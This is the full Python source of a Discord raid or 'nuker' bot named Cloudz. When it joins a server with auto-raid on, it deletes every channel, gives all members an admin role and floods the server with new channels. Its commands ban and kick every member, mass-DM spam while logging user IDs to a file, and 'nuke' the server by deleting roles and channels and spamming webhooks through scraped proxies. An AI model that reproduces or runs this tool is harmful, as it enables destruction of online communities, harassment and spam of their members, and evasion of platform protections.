import asyncio
import json
import os
import random
import sys
import threading

import colorama
import discord
import requests
from colorama import Fore
from discord import Permissions
from discord.ext import commands
from tqdm import tqdm

from util.proxies import proxy_scrape, proxy

colorama.deinit()

__author__ = 'ProfessedRay4#1436'

with open('config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    CHANNEL_NAMES = config["CHANNEL_NAMES"]
    MESSAGE = config["MESSAGE"]
    PREFIX = config["PREFIX"]
    AMOUNT_OF_CHANNELS = config["AMOUNT_OF_CHANNELS"]
    SERVER_NAME = config["SERVER_NAME"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]
    AUTO_RAID = config["AUTO_RAID"]

from pystyle import Colorate, Colors, Center

banner = Center.XCenter("""
 

 ▄████▄   ██▓     ▒█████   █    ██ ▓█████▄ ▒███████▒
▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██  ▓██▒▒██▀ ██▌▒ ▒ ▒ ▄▀░
▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▒██░░██   █▌░ ▒ ▄▀▒░ 
▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓▓█  ░██░░▓█▄   ▌  ▄▀▒   ░
▒ ▓███▀ ░░██████▒░ ████▓▒░▒▒█████▓ ░▒████▓ ▒███████▒
░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▒ ▓░▒░▒
  ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░░▒░ ░ ░  ░ ▒  ▒ ░░▒ ▒ ░ ▒
░          ░ ░   ░ ░ ░ ▒   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ░ ░
░ ░          ░  ░    ░ ░     ░        ░      ░ ░    
░                                   ░      ░        
            Made by ProfessedRay4#2985
                                             
""")

intents = discord.Intents.all()
client = commands.Bot(command_prefix=PREFIX, intents=intents)
client.remove_command('help')
list = Fore.RED + f"""
Channel names = {CHANNEL_NAMES}
Message = {MESSAGE}
Prefix = {PREFIX}
Amount of channels = {AMOUNT_OF_CHANNELS}
Server name = {SERVER_NAME}

=====COMMANDS=====

{PREFIX}massdm - attempts to dm all members
{PREFIX}ban_all - bans everyone
{PREFIX}nuke - Nukes the server
{PREFIX}kick_all - Kicks everyone
{PREFIX}invites - Get invites
"""


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Porn ;)"))
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("title " + f"Cloudz")
    print(Colorate.Vertical(Colors.purple_to_red, banner, 2))
    print(list)


@client.event
async def on_guild_join(guild):
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)

    auto_raid_enabled = config.get('AUTO_RAID', False)

    if auto_raid_enabled:
        print(Fore.GREEN + f"Joined {guild.name}, starting raid")

        for channel in guild.channels:
            await channel.delete()

        role = await guild.create_role(name='قضيب', permissions=discord.Permissions.all())

        for member in guild.members:
            await member.add_roles(role)

        num_channels = 50
        channel_names = [f'قضيب{i}' for i in range(1, num_channels + 1)]

        for name in channel_names:
            await guild.create_text_channel(name)

    else:
        print(Fore.RED + "Skipped auto raid (set to true in config.json)")


@client.command()
async def nuke(ctx):
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=str(SERVER_NAME))
        try:
            role = discord.utils.get(ctx.guild.roles, name="@everyone")
            await role.edit(permissions=Permissions.all())
        except:
            print(Fore.RED + "couldn't give everyone admin")
        #  Delete roles
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print(f"couldn't delete {role}")
        print(Fore.BLUE + 'Deleting all channels!!!')
        for channel in tqdm(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                print(Fore.RED + "Could not delete channels")
        print('')
        print('Making channels!!!')
        for i in tqdm(range(int(AMOUNT_OF_CHANNELS))):
            try:
                kdot = await ctx.guild.create_text_channel(name='سيء السمعة')
                webhook = await kdot.create_webhook(name='سيء السمعة')
                threading.Thread(target=spamhook, args=(webhook.url,)).start()
            except:
                print(Fore.RED + 'There was an error while creating channels')
    except:
        print("سيء السمعة")


@client.command()
async def massdm(ctx):
    await ctx.message.delete()  # nobody wanna see ur message ;)
    for user in ctx.guild.members:
        try:
            from random import randint
            num = randint(1, 2)  # makes discord not lick ur weiner (sometimes)
            await user.send(MESSAGE)  # sends dm
            # asyncio.wait(num) #wait for num seconds
            print(Fore.BLUE + f"Dm'd {user.name}")  # print who we dm
            with open('scrape.txt', 'a') as f:  # open scrape.txt
                f.write(str(user.id) + '\n')  # write user id to scrape.txt
        except:  # if it fails
            print(Fore.RED + f"Couldn't dm {user.name}")  # no dm 4 u


@client.command()
async def ban_all(ctx):  # will rate limit the bot
    try:
        for member in ctx.guild.members:
            try:
                await member.ban(reason='Banned by ProfessedRay4#1436')
                print(Fore.BLUE + f'Banned {member.name}')
                asyncio.wait(.5)
            except:
                print(Fore.RED + f'Failed to ban {member.name}')
    except:
        print(Fore.GREEN + 'No more people to ban!')


@client.command()
async def kick_all(ctx, guild):  # discord will lick ur bots pp
    try:
        for member in ctx.guild.members:
            await member.kick(reason='Kicked by ProfessedRay4#1436')
            print(Fore.BLUE + f'Kicked {member.name}')
            asyncio.wait(.5)
    except:
        print(Fore.RED + f'Failed to kick {member.name}')


@client.command()
async def invites(ctx, guild):
    try:
        for guild in client.guilds:
            print(f'Bot is connected to {guild.name} (ID: {guild.id})')
            invites = await guild.invites()
            if len(invites) > 0:
                print(f"Invite link for {guild.name}: {invites[0].url}")
    except:
        print(Fore.RED + f"Invite link not found for {guild.name}")


def spamhookp(hook):
    for i in range(int(AMOUNT_OF_CHANNELS)):
        if SPAM_PRN:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0, len(lines) - 1)
                    ran = lines[random_int]
                requests.post(hook, data={'content': f"{MESSAGE} + {ran}"}, proxies=proxy())
            except:
                print(Fore.RED + f'error spamming! {hook}')
        else:
            try:
                requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
            except:
                print(Fore.RED + f'error spamming! {hook}')
    sys.exit()


def spamhook(hook):
    for i in range(int(AMOUNT_OF_CHANNELS)):
        if SPAM_PRN:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0, len(lines) - 1)
                    ran = lines[random_int]
                requests.post(hook, data={'content': f"{MESSAGE} + {ran}"})
            except:
                print(Fore.RED + f'error spamming! {hook}')
        else:
            try:
                requests.post(hook, data={'content': MESSAGE})
            except:
                print(Fore.RED + f'error spamming! {hook}')
    sys.exit()


if PROXIES:
    proxy_scrape()

try:
    client.run(TOKEN)
except Exception as e:
    print(e)
    input()
    os._exit(0)
